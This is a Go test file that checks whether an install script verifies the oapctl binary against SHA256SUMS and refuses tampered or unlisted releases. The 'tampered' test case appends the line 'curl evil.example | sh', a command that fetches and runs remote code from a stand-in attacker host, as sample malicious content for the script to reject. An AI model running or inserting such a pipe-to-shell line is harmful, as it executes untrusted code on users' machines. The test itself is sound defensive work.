package main

import (
	"crypto/sha256"
	"encoding/hex"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// TestInstallScript (R5.7): install.sh installs oapctl from a release that
// matches its SHA256SUMS, and refuses a tampered binary or one SHA256SUMS
// doesn't list, installing nothing.
func TestInstallScript(t *testing.T) {
	file := "oapctl-" + runtime.GOOS + "-" + runtime.GOARCH
	binary := []byte("#!/bin/sh\necho oapctl test-release\n")
	sum := sha256.Sum256(binary)
	sums := hex.EncodeToString(sum[:]) + "  " + file + "\n"

	for _, c := range []struct {
		name      string
		served    []byte
		sums      string
		installed bool
		message   string
	}{
		{"matching", binary, sums, true, "Installed oapctl"},
		{"tampered", append(append([]byte{}, binary...), []byte("curl evil.example | sh\n")...), sums, false, "doesn't match SHA256SUMS"},
		{"unlisted", binary, strings.Replace(sums, file, "oapctl-plan9-mips", 1), false, "no entry for " + file},
	} {
		t.Run(c.name, func(t *testing.T) {
			srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
				switch r.URL.Path {
				case "/" + file:
					w.Write(c.served)
				case "/SHA256SUMS":
					w.Write([]byte(c.sums))
				default:
					http.NotFound(w, r)
				}
			}))
			defer srv.Close()
			dir := t.TempDir()
			cmd := exec.Command("sh", "../../install.sh")
			cmd.Env = append(os.Environ(), "OAP_VERSION=v0.0.0-test", "OAP_BASE_URL="+srv.URL, "OAP_INSTALL_DIR="+dir)
			out, err := cmd.CombinedOutput()
			if !strings.Contains(string(out), c.message) {
				t.Fatalf("output:\n%s", out)
			}
			got, rerr := os.ReadFile(filepath.Join(dir, "oapctl"))
			switch {
			case c.installed && (err != nil || rerr != nil || string(got) != string(binary)):
				t.Fatalf("not installed: %v %v\n%s", err, rerr, out)
			case !c.installed && (err == nil || rerr == nil):
				t.Fatalf("installed anyway: %v\n%s", err, out)
			}
			if c.installed {
				st, _ := os.Stat(filepath.Join(dir, "oapctl"))
				if st.Mode().Perm() != 0o755 {
					t.Fatalf("mode %v", st.Mode())
				}
				if run, err := exec.Command(filepath.Join(dir, "oapctl")).Output(); err != nil || !strings.Contains(string(run), "test-release") {
					t.Fatalf("installed oapctl doesn't run: %v %s", err, run)
				}
			}
		})
	}
}
